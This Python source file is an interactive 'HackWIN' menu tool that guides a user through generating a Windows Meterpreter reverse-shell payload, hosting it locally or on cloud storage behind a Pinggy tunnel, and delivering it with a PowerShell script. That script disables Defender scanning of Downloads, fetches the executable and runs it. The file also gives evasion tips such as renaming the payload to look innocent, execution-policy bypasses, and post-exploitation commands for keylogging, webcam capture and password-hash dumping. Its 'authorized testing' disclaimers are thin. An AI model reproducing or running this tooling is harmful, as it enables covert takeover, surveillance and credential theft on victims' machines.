#!/usr/bin/env python3

import os
import sys
import time
import base64

RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
RESET = "\033[0m"

BANNER = f"""{YELLOW}
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║         ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗    ██╗       ║
║         ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║    ██║       ║
║         ███████║███████║██║     █████╔╝ ██║ █╗ ██║       ║
║         ██╔══██║██╔══██║██║     ██╔═██╗ ██║███╗██║       ║
║         ██║  ██║██║  ██║╚██████╗██║  ██╗╚███╔███╔╝       ║
║         ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚══╝╚══╝        ║
║                      ██╗███╗   ██╗                        ║
║                      ██║████╗  ██║                        ║
║                      ██║██╔██╗ ██║                        ║
║                      ██║██║╚██╗██║                        ║
║                      ██║██║ ╚████║                        ║
║                      ╚═╝╚═╝  ╚═══╝                        ║
║                                                            ║
║        Windows Payload Generation Framework               ║
║              For Educational Purposes                     ║
║                   Authorized Testing                     ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝{RESET}
{MAGENTA}Developer: b1l4l-sec | GitHub: https://github.com/b1l4l-sec{RESET}
{CYAN}Version: 2.0 Pro - Local & Global Deployment{RESET}
"""

def clear():
    os.system('clear')

def print_menu():
    print(f"""
{BOLD}{CYAN}┌────────────────────────────────────────────────────────┐
│                   HACKWIN MAIN MENU                      │
└────────────────────────────────────────────────────────┘{RESET}

  {GREEN}[1]{RESET} {BOLD}Local Network Payload Generation{RESET}
      └─ For targets on same LAN (fastest & simplest)

  {GREEN}[2]{RESET} {BOLD}Global Payload Generation (Cloud + Pinggy){RESET}
      └─ For targets over internet (cloud storage delivery)

  {GREEN}[3]{RESET} {BOLD}Generate Listener Command{RESET}
      └─ Get shell access command

  {YELLOW}[4]{RESET} {BOLD}Setup Guide & Requirements{RESET}
      └─ Installation and prerequisites

  {RED}[0]{RESET} {BOLD}Exit{RESET}

{CYAN}═══════════════════════════════════════════════════════════{RESET}
""")

def generate_local_payload():
    clear()
    print(BANNER)
    print(f"{BOLD}{CYAN}LOCAL NETWORK PAYLOAD GENERATION{RESET}\n")
    print(f"{YELLOW}Best for: LAN environments, same WiFi network, direct IP access{RESET}\n")

    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{YELLOW}STEP 1: Create Payload with msfvenom{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    lhost = input(f"{CYAN}Enter your LOCAL IP address (LHOST): {RESET}").strip()
    if not lhost:
        print(f"{RED}Error: IP cannot be empty{RESET}")
        time.sleep(2)
        return

    lport = input(f"{CYAN}Enter listening port (LPORT, default 4444): {RESET}").strip()
    if not lport:
        lport = "4444"

    clear()
    print(BANNER)
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{GREEN}✓ STEP 1: Generate Payload Binary{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    msfvenom_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe"
    print(f"{YELLOW}Run this command on your attacking machine:{RESET}\n")
    print(f"{GREEN}{msfvenom_cmd}{RESET}\n")

    print(f"{CYAN}What this does:{RESET}")
    print(f"  • Creates Windows executable payload")
    print(f"  • Configured to connect back to {lhost}:{lport}")
    print(f"  • Uses Meterpreter for advanced control\n")

    input(f"{CYAN}Press Enter after creating payload.exe...{RESET}")

    clear()
    print(BANNER)
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{GREEN}✓ STEP 2: Host Payload on Local Network{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    print(f"{YELLOW}In a NEW terminal window, navigate to payload directory:{RESET}\n")
    print(f"{GREEN}cd /path/to/payload/directory{RESET}")
    print(f"{GREEN}python3 -m http.server 9090{RESET}\n")

    print(f"{CYAN}Your payload will be available at:{RESET}")
    print(f"{BOLD}http://{lhost}:9090/payload.exe{RESET}\n")

    print(f"{YELLOW}Keep this server running during the entire operation!{RESET}\n")

    input(f"{CYAN}Press Enter after starting HTTP server...{RESET}")

    clear()
    print(BANNER)
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{GREEN}✓ STEP 3: PowerShell Delivery Script{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    url = f"http://{lhost}:9090/payload.exe"
    custom_url = input(f"{CYAN}Use default URL ({url})? (y/n): {RESET}").strip().lower()

    if custom_url == 'n':
        url = input(f"{CYAN}Enter custom payload URL: {RESET}").strip()

    powershell_script = f"""# HackWIN Local Network Delivery Script
Add-MpPreference -ExclusionPath $env:USERPROFILE\\Downloads
$url = '{url}'
$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'client.exe')

try {{
    Write-Host "Downloading payload..." -ForegroundColor Green
    Invoke-WebRequest -Uri $url -OutFile $outputFile -UseBasicParsing
    Write-Host "Download complete. Executing..." -ForegroundColor Green
    Start-Sleep -Milliseconds 500
    Start-Process -FilePath $outputFile
    Write-Host "Payload executed successfully." -ForegroundColor Green
}} catch {{
    Write-Host "Error: $_" -ForegroundColor Red
}}"""

    clear()
    print(BANNER)
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{GREEN}✓ LOCAL NETWORK PAYLOAD READY{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    print(f"{BOLD}{YELLOW}What this script does:{RESET}")
    print(f"  {CYAN}1. Disables Windows Defender for Downloads folder{RESET}")
    print(f"  2. Downloads payload from your local server{RESET}")
    print(f"  3. Executes payload automatically{RESET}")
    print(f"  4. Establishes reverse connection to your machine{RESET}\n")

    print(f"{BOLD}{YELLOW}Copy this PowerShell script to TARGET MACHINE:{RESET}\n")
    print(f"{GREEN}┌────────────────────────────────────────────────────────┐{RESET}")
    print(f"{GREEN}{powershell_script}{RESET}")
    print(f"{GREEN}└────────────────────────────────────────────────────────┘{RESET}\n")

    save_choice = input(f"{CYAN}Save to file? (y/n): {RESET}").strip().lower()
    if save_choice == 'y':
        filename = f"hackwin_local_{int(time.time())}.ps1"
        try:
            with open(filename, 'w') as f:
                f.write(powershell_script)
            print(f"{GREEN}✓ Saved to {filename}{RESET}")
        except Exception as e:
            print(f"{RED}Error saving file: {e}{RESET}")

    print(f"\n{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{CYAN}EXECUTION SEQUENCE:{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{YELLOW}1. Start listener (use option [3]){RESET}")
    print(f"{YELLOW}2. Ensure HTTP server is running{RESET}")
    print(f"{YELLOW}3. Run PowerShell script on target as Administrator{RESET}")
    print(f"{YELLOW}4. Wait for reverse shell connection{RESET}\n")

    input(f"{BOLD}{CYAN}Press Enter to continue...{RESET}")

def generate_global_payload():
    clear()
    print(BANNER)
    print(f"{BOLD}{CYAN}GLOBAL PAYLOAD GENERATION (CLOUD STORAGE + PINGGY){RESET}\n")
    print(f"{YELLOW}Uses: Cloud storage for payload delivery + Pinggy TCP for reverse shell{RESET}\n")

    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{YELLOW}STEP 1: Setup Pinggy TCP Tunnel FIRST{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    print(f"{RED}{BOLD}⚠ CRITICAL: Get Pinggy TCP details BEFORE creating payload!{RESET}\n")

    print(f"{BOLD}{YELLOW}Terminal 1 - Setup Pinggy TCP Tunnel:{RESET}\n")
    print(f"{GREEN}ssh -p 443 -R0:localhost:4444 tcp@a.pinggy.io{RESET}\n")
    print(f"{CYAN}OR for free tier:{RESET}\n")
    print(f"{GREEN}ssh -p 443 -R0:localhost:4444 -L4300:localhost:4300 qr+tcp@free.pinggy.io{RESET}\n")

    print(f"{CYAN}Pinggy will output TCP URL like:{RESET}")
    print(f"{BOLD}tcp://ufhxl-105-75-18-66.a.free.pinggy.link:37423{RESET}\n")

    print(f"{YELLOW}Copy the FULL TCP URL including tcp://{RESET}\n")

    pinggy_tcp_full = input(f"{CYAN}Paste Pinggy TCP URL: {RESET}").strip()
    
    if not pinggy_tcp_full:
        print(f"{RED}Error: TCP URL cannot be empty{RESET}")
        time.sleep(2)
        return
    
    # Parse the URL
    if pinggy_tcp_full.startswith('tcp://'):
        pinggy_tcp_full = pinggy_tcp_full[6:]  # Remove tcp://
    
    if ':' in pinggy_tcp_full:
        pinggy_tcp_host = pinggy_tcp_full.split(':')[0]
        pinggy_tcp_port = pinggy_tcp_full.split(':')[1]
    else:
        print(f"{RED}Error: Invalid format. Need hostname:port{RESET}")
        time.sleep(2)
        return
    
    print(f"\n{GREEN}✓ Parsed Successfully{RESET}")
    print(f"  LHOST: {BOLD}{pinggy_tcp_host}{RESET}")
    print(f"  LPORT: {BOLD}{pinggy_tcp_port}{RESET}\n")
    
    input(f"{CYAN}Press Enter to continue...{RESET}")

    clear()
    print(BANNER)
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{GREEN}✓ STEP 2: Create ONE Payload with Pinggy Details{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    msfvenom_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={pinggy_tcp_host} LPORT={pinggy_tcp_port} -f exe -o payload.exe"

    print(f"{YELLOW}Run this command to create your payload:{RESET}\n")
    print(f"{GREEN}{msfvenom_cmd}{RESET}\n")

    print(f"{CYAN}This creates:{RESET}")
    print(f"  • ONE payload.exe file")
    print(f"  • Configured to connect to: {pinggy_tcp_host}:{pinggy_tcp_port}")
    print(f"  • This is the ONLY payload you need!\n")

    print(f"{YELLOW}After creating, verify it:{RESET}")
    print(f"{GREEN}ls -lh payload.exe          {CYAN}# Check file size (should be 70K-200K){RESET}")
    print(f"{GREEN}file payload.exe            {CYAN}# Should say: PE32 executable{RESET}")
    print(f"{GREEN}strings payload.exe | grep pinggy  {CYAN}# Should show your hostname{RESET}\n")

    input(f"{CYAN}Press Enter after creating and verifying payload.exe...{RESET}")

    clear()
    print(BANNER)
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{GREEN}✓ STEP 3: Upload Payload to Cloud Storage{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    print(f"{BOLD}{YELLOW}⚠ IMPORTANT: Pinggy HTTP often blocks payload downloads{RESET}")
    print(f"{CYAN}Instead, upload payload.exe to cloud storage for reliable delivery{RESET}\n")

    print(f"{BOLD}{YELLOW}Recommended Cloud Storage Options:{RESET}\n")
    
    print(f"{GREEN}Option 1: Google Drive (Recommended){RESET}")
    print(f"  1. Go to https://drive.google.com")
    print(f"  2. Upload payload.exe")
    print(f"  3. Right-click → Share → Anyone with link can view")
    print(f"  4. Copy the share link")
    print(f"  5. Modify the link format:")
    print(f"     FROM: https://drive.google.com/file/d/FILE_ID/view?usp=sharing")
    print(f"     TO:   https://drive.google.com/uc?export=download&id=FILE_ID")
    print(f"  Example: https://drive.google.com/uc?export=download&id=1a2B3c4D5e6F7g8H9i0J\n")

    print(f"{GREEN}Option 2: Dropbox{RESET}")
    print(f"  1. Go to https://dropbox.com")
    print(f"  2. Upload payload.exe")
    print(f"  3. Click Share → Create link")
    print(f"  4. Change the end of URL from ?dl=0 to ?dl=1")
    print(f"  Example: https://www.dropbox.com/s/abc123/payload.exe?dl=1\n")

    print(f"{GREEN}Option 3: JottaCloud{RESET}")
    print(f"  1. Go to https://www.jottacloud.com")
    print(f"  2. Upload payload.exe")
    print(f"  3. Right-click → Share link")
    print(f"  4. Copy the public link")
    print(f"  Example: https://www.jottacloud.com/s/abc123xyz\n")

    print(f"{GREEN}Option 4: MediaFire{RESET}")
    print(f"  1. Go to https://www.mediafire.com")
    print(f"  2. Upload payload.exe (rename to avoid detection)")
    print(f"  3. Get direct download link")
    print(f"  Example: https://www.mediafire.com/file/abc123/payload.exe/file\n")

    print(f"{GREEN}Option 5: GitHub (Advanced){RESET}")
    print(f"  1. Create a private GitHub repository")
    print(f"  2. Upload payload.exe")
    print(f"  3. Use raw.githubusercontent.com URL")
    print(f"  Example: https://raw.githubusercontent.com/user/repo/main/payload.exe\n")

    print(f"{YELLOW}Pro Tip: Rename payload.exe to something innocent like:{RESET}")
    print(f"  • update.exe")
    print(f"  • installer.exe")
    print(f"  • setup.exe")
    print(f"  • document.exe\n")

    print(f"{RED}⚠ Make sure the link is a DIRECT DOWNLOAD link, not a preview page!{RESET}\n")

    input(f"{CYAN}Press Enter after uploading payload to cloud storage...{RESET}")

    clear()
    print(BANNER)
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{GREEN}✓ STEP 4: PowerShell Delivery Script{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    payload_url = input(f"{CYAN}Paste your cloud storage DIRECT DOWNLOAD URL: {RESET}").strip()

    if not payload_url:
        print(f"{RED}Error: URL cannot be empty{RESET}")
        time.sleep(2)
        return

    if not payload_url.startswith(('http://', 'https://')):
        print(f"{RED}Error: URL must start with http:// or https://{RESET}")
        time.sleep(2)
        return

    powershell_script = f"""# HackWIN Global Delivery Script (Pinggy)
Add-MpPreference -ExclusionPath $env:USERPROFILE\\Downloads
$url = '{payload_url}'
$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'client.exe')

try {{
    Write-Host "Connecting to server..." -ForegroundColor Green
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $outputFile -UseBasicParsing
    Write-Host "Download complete. Executing..." -ForegroundColor Green
    Start-Sleep -Milliseconds 500
    Start-Process -FilePath $outputFile
    Write-Host "Connection established." -ForegroundColor Green
}} catch {{
    Write-Host "Error: $_" -ForegroundColor Red
}}"""

    print(f"{BOLD}{YELLOW}What this script does:{RESET}")
    print(f"  {CYAN}1. Downloads payload from: {payload_url}{RESET}")
    print(f"  2. Payload connects back to: {pinggy_tcp_host}:{pinggy_tcp_port}{RESET}")
    print(f"  3. Pinggy forwards connection to your listener{RESET}\n")

    print(f"{BOLD}{YELLOW}Copy this PowerShell script to TARGET MACHINE:{RESET}\n")
    print(f"{GREEN}┌────────────────────────────────────────────────────────┐{RESET}")
    print(f"{GREEN}{powershell_script}{RESET}")
    print(f"{GREEN}└────────────────────────────────────────────────────────┘{RESET}\n")

    save_choice = input(f"{CYAN}Save to file? (y/n): {RESET}").strip().lower()
    if save_choice == 'y':
        filename = f"hackwin_global_{int(time.time())}.ps1"
        try:
            with open(filename, 'w') as f:
                f.write(powershell_script)
            print(f"{GREEN}✓ Saved to {filename}{RESET}")
            
            # Also save terminal commands reference
            ref_filename = f"hackwin_global_setup_{int(time.time())}.txt"
            reference = f"""HackWIN Global Setup Reference
{'='*60}

TERMINAL 1 - TCP Pinggy Tunnel (KEEP RUNNING):
ssh -p 443 -R0:localhost:4444 tcp@a.pinggy.io
Your TCP: {pinggy_tcp_host}:{pinggy_tcp_port}

CLOUD STORAGE - Payload Upload:
Upload payload.exe to Google Drive/Dropbox/JottaCloud/etc.
Direct Download URL: {payload_url}

TERMINAL 2 - Metasploit Listener (START BEFORE EXECUTING ON TARGET):
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
exploit

Payload Command (ALREADY DONE):
{msfvenom_cmd}

Delivery URL (Cloud Storage):
{payload_url}

TARGET EXECUTES:
PowerShell script saved in {filename}

IMPORTANT NOTES:
- Pinggy HTTP often blocks .exe downloads
- Cloud storage provides reliable file delivery
- Make sure URL is DIRECT DOWNLOAD, not preview
- TCP Pinggy tunnel must stay active for reverse shell
"""
            with open(ref_filename, 'w') as f:
                f.write(reference)
            print(f"{GREEN}✓ Setup reference saved to {ref_filename}{RESET}")
            
        except Exception as e:
            print(f"{RED}Error saving file: {e}{RESET}")

    print(f"\n{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{CYAN}FINAL CHECKLIST BEFORE ATTACK:{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{YELLOW}✓ Terminal 1: TCP Pinggy tunnel running{RESET}")
    print(f"{YELLOW}✓ Cloud Storage: payload.exe uploaded with direct download link{RESET}")
    print(f"{YELLOW}✓ Terminal 2: Metasploit listener active (use option [3]){RESET}")
    print(f"{YELLOW}✓ ONE payload.exe created with Pinggy TCP details{RESET}")
    print(f"{YELLOW}✓ Ready to execute PowerShell script on target{RESET}\n")

    print(f"{RED}{BOLD}REMEMBER:{RESET}")
    print(f"{RED}• TCP Pinggy tunnel must stay active for reverse shell{RESET}")
    print(f"{RED}• Start listener BEFORE target executes script{RESET}")
    print(f"{RED}• Use DIRECT DOWNLOAD link from cloud storage{RESET}")
    print(f"{RED}• Only ONE payload.exe needed (with Pinggy TCP details){RESET}\n")

    input(f"{BOLD}{CYAN}Press Enter to continue...{RESET}")

def generate_listener():
    clear()
    print(BANNER)
    print(f"{BOLD}{CYAN}LISTENER SETUP FOR REVERSE SHELL{RESET}\n")

    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{YELLOW}CRITICAL: Start listener BEFORE running script on target!{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    deployment_type = input(f"{CYAN}Deployment type - [1] Local or [2] Global (Pinggy): {RESET}").strip()

    if deployment_type == '1':
        # Local deployment
        lhost = input(f"{CYAN}Enter your LOCAL IP (LHOST): {RESET}").strip()
        if not lhost:
            print(f"{RED}Error: IP address cannot be empty{RESET}")
            time.sleep(2)
            return
        listen_host = lhost
    else:
        # Global deployment with Pinggy
        listen_host = "127.0.0.1"
        print(f"{YELLOW}For Pinggy tunnel, listener binds to localhost (127.0.0.1){RESET}")

    lport = input(f"{CYAN}Enter listening port (LPORT, default 4444): {RESET}").strip()
    if not lport:
        lport = "4444"

    clear()
    print(BANNER)
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{GREEN}✓ Listener Configuration Generated{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    if deployment_type == '2':
        print(f"{BOLD}{YELLOW}⚠ REMINDER: Ensure Pinggy TCP tunnel is running!{RESET}")
        print(f"{GREEN}ssh -p 443 -R0:localhost:{lport} tcp@a.pinggy.io{RESET}")
        print(f"{GREEN}# OR: ssh -p 443 -R0:localhost:{lport} -L4300:localhost:4300 qr+tcp@free.pinggy.io{RESET}\n")

    print(f"{BOLD}{YELLOW}OPTION 1: Using Metasploit (Recommended){RESET}\n")
    print(f"{CYAN}Launch msfconsole:{RESET}")
    print(f"{GREEN}msfconsole{RESET}\n")

    print(f"{CYAN}Then run these commands:{RESET}\n")
    meterpreter_commands = f"""use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {listen_host}
set LPORT {lport}
exploit"""

    print(f"{GREEN}{meterpreter_commands}{RESET}\n")

    print(f"{CYAN}Advanced Meterpreter commands after connection:{RESET}")
    print(f"  {YELLOW}sysinfo{RESET}          - System information")
    print(f"  {YELLOW}getuid{RESET}           - Current user")
    print(f"  {YELLOW}screenshot{RESET}       - Capture screen")
    print(f"  {YELLOW}webcam_snap{RESET}      - Take webcam photo")
    print(f"  {YELLOW}keyscan_start{RESET}    - Start keylogger")
    print(f"  {YELLOW}hashdump{RESET}         - Dump password hashes")
    print(f"  {YELLOW}shell{RESET}            - Drop to system shell\n")

    print(f"{BOLD}{YELLOW}OPTION 2: Using Netcat (Basic Alternative){RESET}\n")
    print(f"{CYAN}In your terminal, run:{RESET}\n")
    print(f"{GREEN}nc -nvlp {lport}{RESET}\n")

    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{CYAN}WORKFLOW CHECKLIST:{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    if deployment_type == '1':
        print(f"{YELLOW}✓ Payload created with your local IP{RESET}")
        print(f"{YELLOW}✓ HTTP server running (python3 -m http.server){RESET}")
        print(f"{YELLOW}✓ Listener started (this terminal){RESET}")
        print(f"{YELLOW}✓ Target has network access to your IP{RESET}")
        print(f"{YELLOW}✓ Ready to execute PowerShell script on target{RESET}\n")
    else:
        print(f"{YELLOW}✓ Payload created with Pinggy TCP details{RESET}")
        print(f"{YELLOW}✓ HTTP server running (python3 -m http.server){RESET}")
        print(f"{YELLOW}✓ Pinggy HTTP tunnel active{RESET}")
        print(f"{YELLOW}✓ Pinggy TCP tunnel active{RESET}")
        print(f"{YELLOW}✓ Listener started (this terminal){RESET}")
        print(f"{YELLOW}✓ Ready to execute PowerShell script on target{RESET}\n")

    print(f"{RED}{BOLD}REMEMBER:{RESET}")
    print(f"{RED}✓ Listener must be running BEFORE target executes script{RESET}")
    print(f"{RED}✓ Keep all required services/tunnels active{RESET}")
    print(f"{RED}✓ Be patient - connection may take a few seconds{RESET}\n")

    input(f"{BOLD}{CYAN}Press Enter to continue...{RESET}")

def show_setup_guide():
    clear()
    print(BANNER)
    print(f"{BOLD}{CYAN}SETUP GUIDE & REQUIREMENTS{RESET}\n")

    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{YELLOW}REQUIRED TOOLS & SOFTWARE{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    print(f"{CYAN}1. Metasploit Framework{RESET}")
    print(f"   Installation:")
    print(f"   {GREEN}# Kali Linux (pre-installed):{RESET}")
    print(f"   {GREEN}apt update && apt install metasploit-framework{RESET}")
    print(f"   {GREEN}# Other Linux:{RESET}")
    print(f"   {GREEN}curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall{RESET}")
    print(f"   {GREEN}chmod 755 msfinstall{RESET}")
    print(f"   {GREEN}./msfinstall{RESET}\n")

    print(f"{CYAN}2. Python 3 (HTTP Server){RESET}")
    print(f"   {GREEN}# Usually pre-installed on Linux{RESET}")
    print(f"   {GREEN}python3 --version{RESET}\n")

    print(f"{CYAN}3. Netcat (Optional){RESET}")
    print(f"   {GREEN}# Usually pre-installed{RESET}")
    print(f"   {GREEN}nc -h{RESET}\n")

    print(f"{CYAN}4. SSH Client (for Pinggy){RESET}")
    print(f"   {GREEN}# Pre-installed on most systems{RESET}")
    print(f"   {GREEN}ssh -V{RESET}\n")

    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{YELLOW}PINGGY TUNNEL SETUP{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    print(f"{CYAN}What is Pinggy?{RESET}")
    print(f"  Pinggy creates secure tunnels to expose local services")
    print(f"  to the internet without port forwarding or public IP.\n")

    print(f"{CYAN}HTTP Tunnel (for payload delivery):{RESET}")
    print(f"  {GREEN}ssh -p 443 -R0:localhost:PORT a.pinggy.io{RESET}")
    print(f"  {GREEN}# OR for free tier:{RESET}")
    print(f"  {GREEN}ssh -p 443 -R0:localhost:PORT -L4300:localhost:4300 qr+tcp@free.pinggy.io{RESET}")
    print(f"  Example: {GREEN}ssh -p 443 -R0:localhost:9090 a.pinggy.io{RESET}\n")

    print(f"{CYAN}TCP Tunnel (for reverse shell):{RESET}")
    print(f"  {GREEN}ssh -p 443 -R0:localhost:PORT tcp@a.pinggy.io{RESET}")
    print(f"  {GREEN}# OR for free tier:{RESET}")
    print(f"  {GREEN}ssh -p 443 -R0:localhost:PORT -L4300:localhost:4300 qr+tcp@free.pinggy.io{RESET}")
    print(f"  Example: {GREEN}ssh -p 443 -R0:localhost:4444 tcp@a.pinggy.io{RESET}\n")
    print(f"  {YELLOW}Pinggy returns format: tcp://hostname:port{RESET}\n")

    print(f"{CYAN}Persistent Tunnels (Premium):{RESET}")
    print(f"  Visit: {BOLD}https://pinggy.io{RESET} for custom subdomains\n")

    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{YELLOW}NETWORK CONFIGURATION{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    print(f"{CYAN}Find Your Local IP:{RESET}")
    print(f"  {GREEN}# Linux:{RESET}")
    print(f"  {GREEN}ip addr show{RESET}")
    print(f"  {GREEN}ifconfig{RESET}")
    print(f"  {GREEN}hostname -I{RESET}")
    print(f"  {GREEN}# Windows:{RESET}")
    print(f"  {GREEN}ipconfig{RESET}\n")

    print(f"{CYAN}Firewall Configuration:{RESET}")
    print(f"  Local deployments may require firewall rules")
    print(f"  {GREEN}# Allow incoming on port 4444 (example):{RESET}")
    print(f"  {GREEN}sudo ufw allow 4444/tcp{RESET}")
    print(f"  {GREEN}sudo firewall-cmd --add-port=4444/tcp{RESET}\n")

    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{YELLOW}WINDOWS POWERSHELL EXECUTION{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    print(f"{CYAN}Bypass Execution Policy:{RESET}")
    print(f"  {GREEN}powershell -ExecutionPolicy Bypass -File script.ps1{RESET}")
    print(f"  {GREEN}powershell -ep bypass -c \"IEX (gc script.ps1 -Raw)\"{RESET}\n")

    print(f"{CYAN}Run as Administrator:{RESET}")
    print(f"  Right-click PowerShell → Run as Administrator\n")

    print(f"{CYAN}Copy-Paste Method:{RESET}")
    print(f"  1. Open PowerShell as Admin")
    print(f"  2. Paste entire script")
    print(f"  3. Press Enter\n")

    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{YELLOW}TESTING RECOMMENDATIONS{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    print(f"{CYAN}Test Environment:{RESET}")
    print(f"  ✓ Use virtual machines (VirtualBox, VMware)")
    print(f"  ✓ Test on isolated network first")
    print(f"  ✓ Verify all components before deployment")
    print(f"  ✓ Have permission for all target systems\n")

    print(f"{CYAN}Troubleshooting:{RESET}")
    print(f"  • Check firewall settings")
    print(f"  • Verify IP addresses are correct")
    print(f"  • Ensure listener is running first")
    print(f"  • Check Windows Defender status")
    print(f"  • Test with simple netcat connection first\n")

    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{YELLOW}PINGGY TROUBLESHOOTING{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    print(f"{CYAN}Common Pinggy Issues:{RESET}\n")

    print(f"{YELLOW}1. Connection Refused:{RESET}")
    print(f"   • Make sure local service is running BEFORE starting tunnel")
    print(f"   • Check: {GREEN}netstat -tuln | grep PORT{RESET}\n")

    print(f"{YELLOW}2. Tunnel Disconnects:{RESET}")
    print(f"   • Free tier has time limits")
    print(f"   • Keep terminal window active")
    print(f"   • Consider premium for stable tunnels\n")

    print(f"{YELLOW}3. Wrong URL Format:{RESET}")
    print(f"   • TCP URLs look like: tcp://hostname:port")
    print(f"   • HTTP URLs look like: https://hostname")
    print(f"   • Copy EXACTLY as shown by Pinggy\n")

    print(f"{YELLOW}4. Payload Won't Download:{RESET}")
    print(f"   • Verify HTTP tunnel is active")
    print(f"   • Test URL in browser first")
    print(f"   • Check file exists: {GREEN}ls -la payload.exe{RESET}\n")

    print(f"{YELLOW}5. No Reverse Connection:{RESET}")
    print(f"   • Verify TCP tunnel shows your local port")
    print(f"   • Payload must use Pinggy hostname:port (not 127.0.0.1)")
    print(f"   • Listener must be on localhost with correct port")
    print(f"   • Example: Listener on 127.0.0.1:4444, Pinggy on localhost:4444\n")

    print(f"{CYAN}Test Your Pinggy Setup:{RESET}")
    print(f"  {GREEN}# Test HTTP tunnel:{RESET}")
    print(f"  {GREEN}curl https://your-pinggy-url.a.free.pinggy.link{RESET}")
    print(f"  {GREEN}# Test TCP tunnel:{RESET}")
    print(f"  {GREEN}nc -zv pinggy-hostname pinggy-port{RESET}\n")

    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{YELLOW}LEGAL & ETHICAL NOTICE{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════{RESET}\n")

    print(f"{RED}{BOLD}WARNING:{RESET}")
    print(f"{RED}This tool is for AUTHORIZED testing only!{RESET}")
    print(f"{RED}Unauthorized access to computer systems is illegal.{RESET}")
    print(f"{RED}Always obtain written permission before testing.{RESET}")
    print(f"{RED}Use only on systems you own or have explicit authorization for.{RESET}\n")

    input(f"{BOLD}{CYAN}Press Enter to return to main menu...{RESET}")

def main():
    while True:
        clear()
        print(BANNER)
        print_menu()

        try:
            choice = input(f"{BOLD}{CYAN}HackWIN{RESET} > ").strip()

            if choice == '1':
                generate_local_payload()
            elif choice == '2':
                generate_global_payload()
            elif choice == '3':
                generate_listener()
            elif choice == '4':
                show_setup_guide()
            elif choice == '0':
                clear()
                print(f"\n{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
